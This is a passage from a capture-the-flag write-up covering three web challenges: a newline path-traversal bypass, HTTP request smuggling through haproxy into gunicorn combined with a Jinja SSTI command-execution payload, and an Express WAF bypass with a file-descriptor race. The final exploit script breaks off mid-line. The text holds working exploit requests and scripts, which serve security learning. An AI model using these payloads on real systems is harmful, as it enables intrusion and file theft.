<p>In the second condition, we are removing the last element of <code>$safeParts</code> array which means that if the element in array if <code>..</code> whatever the last character is will be removed. Combining this with the regex bypass earlier of <code>newline</code>. We can send an input such as:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">&#92;n/../index.php</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>This bypassed the filter and we can read the <code>index.php</code> file. The final script to read the flag:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> requests</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">payload </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">&#92;n</span><span style="color: #C3E88D">/../.ht_flag.txt</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">r </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> requests</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #82AAFF">    </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">http://3.142.89.90:32989?file=asd</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #82AAFF">    </span><span style="color: #EEFFFF">data</span><span style="color: #89DDFF">=&#123;</span></div><div class='line'><span style="color: #82AAFF">        </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">file</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">:</span><span style="color: #82AAFF"> payload</span></div><div class='line'><span style="color: #82AAFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">r</span><span style="color: #89DDFF">.</span><span style="color: #F07178">text</span><span style="color: #89DDFF">)</span></div></code></div></pre><!-- HTML_TAG_END -->
<h2 id="smg--medium"><a href="#smg--medium">SMG | Medium</a></h2>
<blockquote><p>This is related to HTTP Descync</p></blockquote>
<p>The challenge contained a <code>haproxy</code> behind which a flask app is running. The web app is basically vulnerable to SSTI. The vulnerable function on the backend is:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">@</span><span style="color: #82AAFF">app</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/admin</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">admin</span><span style="color: #89DDFF">():</span></div><div class='line'><span style="color: #EEFFFF">    user_input </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> request</span><span style="color: #89DDFF">.</span><span style="color: #F07178">form</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">get</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">input</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">user_input</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">file</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">sys</span><span style="color: #89DDFF">.</span><span style="color: #F07178">stderr</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">any</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">bl_item </span><span style="color: #89DDFF">in</span><span style="color: #82AAFF"> user_input </span><span style="color: #89DDFF">for</span><span style="color: #82AAFF"> bl_item </span><span style="color: #89DDFF">in</span><span style="color: #82AAFF"> blacklist</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Blocked input!</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">try</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">render_template_string</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"Output: </span><span style="color: #82AAFF">&#123;user_input&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">except</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Exception</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">as</span><span style="color: #EEFFFF"> e</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">str</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">e</span><span style="color: #89DDFF">)</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>The input from user is being directly passed through <code>render_template_string</code> function. This looks quite straight forward. However, <code>haproxy</code> doesn’t let us access URL:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" conf="true"><div class='code-container'><code>frontend http
    bind *:80
    default_backend web

    acl restricted_page path_sub -i admin
    http-request deny if restricted_page
    acl restricted_page path_sub %
    http-request deny if restricted_page</code></div></pre><!-- Note from shiki-twoslash: the language conf was not set up for Shiki to use, and so there is no code highlighting --><!-- HTML_TAG_END -->
<p>Morever, with second ACL condition, its also difficult to provide <code>URL-encoded</code> strings. Reading the code, we are using a very specific version of <code>gunicorn</code> in <code>Dockerfile</code>:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">FROM haproxy:1.9.10</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">USER root</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">RUN apt update -y</span></div><div class='line'><span style="color: undefined">RUN apt install -y python3 python3-pip</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">RUN pip3 install -v 'gunicorn&lt;=20.0.4'</span></div><div class='line'><span style="color: undefined">RUN pip3 install flask</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>The version <code>gunicorn&lt;=20.0.4</code> is very specific here to be exact. Looking online, i came across an HTTP Desync in this very specific version. Reading the blogs, i found a request specific for <code>haproxy</code> with <code>gunicorn</code>:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">GET / HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost</span></div><div class='line'><span style="color: undefined">Content-Length: 68</span></div><div class='line'><span style="color: undefined">Sec-Websocket-Key1: x</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">xxxxxxxxGET /admin HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost</span></div><div class='line'><span style="color: undefined">Content-Length: 35</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">GET / HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost</span></div><div class='line'><span style="color: undefined"></span></div></code></div></pre><!-- HTML_TAG_END -->
<p>The request worked. However, everytime you change the payload the <code>Content-Length</code> here needs to be very correctly specified. If this is wrong, this would result in error. The first content length header
of <code>68</code> starts from the letter <code>xxx..</code> and ends where the next request starts. While the second header of length <code>35</code> starts at the beginning of body which is at <code>GET</code> at the moment
and it ends at the <code>\r\n\r\n</code>. </p>
<p>The left up part is SSTI. Reading the filters, we can’t use <code>{{</code> and <code>}}</code>. However, payloads like <code>{%%}</code> can still be used. The <code>{% with %}</code> tag can be used to get RCE:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" html="true"><div class="language-id">html</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">&#123;% with a=&#123;&#125; %&#125;&#123;% endwith %&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>Initially i called <code>import_string</code> from <code>__globals__</code> but that doesn’t work for some reason. So, lets go the old way of finding the <code>Popen</code> function first. Get the classes:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&#123;%</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">with</span><span style="color: #EEFFFF"> a=</span><span style="color: #89DDFF">""</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__class__</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__mro__</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">].</span><span style="color: #EEFFFF">__subclasses__</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">%&#125;&#123;%</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">a</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">%&#125;&#123;%</span><span style="color: #EEFFFF"> endwith </span><span style="color: #89DDFF">%&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>This would result in a large output. Clean the output, store the list properly and the index of the <code>Popen</code> function. Once, you get the index, payload becomes simple:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&#123;%</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">with</span><span style="color: #EEFFFF"> a=</span><span style="color: #89DDFF">""</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__class__</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__mro__</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">].</span><span style="color: #EEFFFF">__subclasses__</span><span style="color: #89DDFF">()[</span><span style="color: #F78C6C">213</span><span style="color: #89DDFF">](</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">cat /flag*</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF">shell</span><span style="color: #89DDFF">=True,</span><span style="color: #EEFFFF">stdout</span><span style="color: #89DDFF">=-</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">communicate</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">%&#125;&#123;%</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">a</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">%&#125;&#123;%</span><span style="color: #EEFFFF"> endwith </span><span style="color: #89DDFF">%&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>With the final request would become:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">GET / HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost:80</span></div><div class='line'><span style="color: undefined">Content-Length: 261</span></div><div class='line'><span style="color: undefined">Sec-Websocket-Key1: x</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">xxxxxxxxPOST /admin HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost</span></div><div class='line'><span style="color: undefined">Content-Length: 177</span></div><div class='line'><span style="color: undefined">Content-Type: application/x-www-form-urlencoded</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">input=&#123;% with a="".__class__.__mro__[1].__subclasses__()[213]('cat /flag*',shell=True,stdout=-1).communicate()</span></div><div class='line'><span style="color: undefined"> %&#125;&#123;% print(a) %&#125;&#123;% endwith %&#125;GET / HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined"></span></div></code></div></pre><!-- HTML_TAG_END -->
<h2 id="wtwaf--hard"><a href="#wtwaf--hard">wtwaf | Hard</a></h2>
<blockquote><p>Code Analysis &amp; Race Condition. I wasn’t able to solve this challenge within due time. And kudos to its author and team Sekai for all the help in solving this later on.</p></blockquote>
<p>Reading the code, we had to exploit 3 things: </p>
<ul><li>Bypass the <code>req.originalUrl.toLowerCase().startsWith(&quot;/admin&quot;)</code> statement.</li>
<li>Bypass the WAF: <code>(item) =&gt; item &amp;&amp; JSON.stringify(item).includes(&quot;flag&quot;)</code></li>
<li>Race conditon in <code>/admin/debug</code> call.</li></ul>
<p>Initially, we need to bypass the middleware:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">app</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">use</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> res</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> next</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">if</span><span style="color: #F07178">([</span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">body</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">headers</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">query</span><span style="color: #F07178">]</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">some</span><span style="color: #F07178">(</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">item</span><span style="color: #89DDFF">)</span><span style="color: #F07178"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">item</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&&</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">JSON</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">stringify</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">item</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">includes</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">flag</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span></div><div class='line'><span style="color: #F07178">    )) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #89DDFF">return</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">status</span><span style="color: #F07178">(</span><span style="color: #F78C6C">403</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">end</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">if</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">originalUrl</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">toLowerCase</span><span style="color: #F07178">()</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">startsWith</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/admin</span><span style="color: #89DDFF">"</span><span style="color: #F07178">) </span><span style="color: #89DDFF">&&</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">headers</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">authorization</span><span style="color: #F07178"> </span><span style="color: #89DDFF">!==</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#96;</span><span style="color: #C3E88D">Bearer </span><span style="color: #89DDFF">$&#123;</span><span style="color: #EEFFFF">ADMIN_AUTH</span><span style="color: #89DDFF">&#125;&#96;</span><span style="color: #F07178">) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #89DDFF">return</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">status</span><span style="color: #F07178">(</span><span style="color: #F78C6C">403</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">end</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">    </span><span style="color: #82AAFF">next</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF">)</span><span style="color: #89DDFF">;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>This would require us to do a bit of code analysis of <code>express.js</code>. The <code>req.originalUrl</code> is created as:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">originalUrl </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">orignalUrl </span><span style="color: #89DDFF">||</span><span style="color: #EEFFFF"> req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">url</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>The <code>req.url</code> is the url after <code>GET</code> in http request. And the requests are resolved through pathname. The first condition can be bypassed by providing a full url after <code>GET</code>:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">GET http://localhost/admin/debug HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost:3000</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>At the reading part we have:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #C792EA">const</span><span style="color: #EEFFFF"> file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">query</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">file </span><span style="color: #89DDFF">??</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/etc/hostname</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">console</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">log</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">file requesting: </span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> file)</span></div><div class='line'><span style="color: #C792EA">const</span><span style="color: #EEFFFF"> contents </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">await</span><span style="color: #EEFFFF"> fsp</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">readFile</span><span style="color: #EEFFFF">(file)</span><span style="color: #89DDFF">;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>The <code>file</code> parameter can be dictionary as extended parameters are not set to <code>false</code>. The <code>readFileSync</code> and similar functions such as <code>readFile</code> can accept a dictionary with a specified set of attributes. The <code>object</code> to read a file is:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #C792EA">let</span><span style="color: #EEFFFF"> obj </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;&#125;</span></div><div class='line'><span style="color: #EEFFFF">obj[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">protocol</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">] </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">file:</span><span style="color: #89DDFF">'</span></div><div class='line'><span style="color: #EEFFFF">obj[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">href</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">] </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">a</span><span style="color: #89DDFF">'</span></div><div class='line'><span style="color: #EEFFFF">obj[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">hostname</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">] </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">''</span></div><div class='line'><span style="color: #EEFFFF">obj[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">pathname</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">] </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/flag.txt</span><span style="color: #89DDFF">'</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>Furthermore, the value of <code>pathname</code> can be `urlencoded as well: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">GET http://localhost/admin/debig?file[href]=a&file[protocol]=file:&file[hostname]=&file[pathname]=/fl%2561g.txt HTTP/1.1</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>When the above url is requested, the file be read. However, an error will trigger at following line:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> (file</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">includes</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">flag</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">)) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">return</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">status</span><span style="color: #F07178">(</span><span style="color: #F78C6C">404</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">end</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>Because now our parameter is an <code>object</code> and it doesn’t have a function named <code>includes</code>. This is where the race conditions comes in. Since, the <code>readFile</code> function is being successfully called, a file descriptor must have opened as well for this.
This is a very short window. If we can race the descriptor when the file is opened, we can read the flag. However, we can’t get just one descriptor as the time in which it opens is way too short. To cope this, we can generate infinity descriptors and try to race one.
This worked actually and the final poc would look like:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> threading</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> requests</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> time</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> socket</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">EXPLOIT</span><span style="color: #89DDFF">:</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    __ENCODED </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/fl%2561g.txt</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">    __TARGET </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">http://localhost:3000</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">    __DICTREAD </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">file[href]=a&file[protocol]=file:&file[hostname]=&file[pathname]=&#123;&#125;</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #EEFFFF">    __DESCRIPTPOR </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/proc/self/fd/26</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">__init__</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">url</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"""</span><span style="color: #C3E88D">&#123;&#125;/admin/debug?&#123;&#125;</span><span style="color: #89DDFF">"""</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">format</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #82AAFF">            </span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">__TARGET</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #82AAFF">            </span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">__DICTREAD</span></div><div class='line'><span style="color: #82AAFF">        </span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">format</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #82AAFF">            </span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">__ENCODED</span></div><div class='line'><span style="color: #82AAFF">        </span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">url2</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"""</span><span style="color: #C3E88D">&#123;&#125;/admin/debug?file=&#123;&#125;</span><span style="color: #89DDFF">"""</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">format</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #82AAFF">            </span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">__TARGET</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #82AAFF">            </span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">__DESCRIPTPOR</span></div><div class='line'><span style="color: #82AAFF">        </span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">request</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> raw_data</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> wait</span><span style="color: #89DDFF">=False):</span></div><div class='line'><span style="color: #EEFFFF">        p </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> socket</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">socket</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">socket</span><span style="color: #89DDFF">.</span><span style="color: #F07178">AF_INET</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> socket</span><span style="color: #89DDFF">.</span><span style="color: #F07178">SOCK_STREAM</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        p</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">connect</span><span style="color: #89DDFF">((</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">192.168.2.69</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">8000</span><span style="color: #89DDFF">))</span></div><div class='line'><span style="color: #EEFFFF">        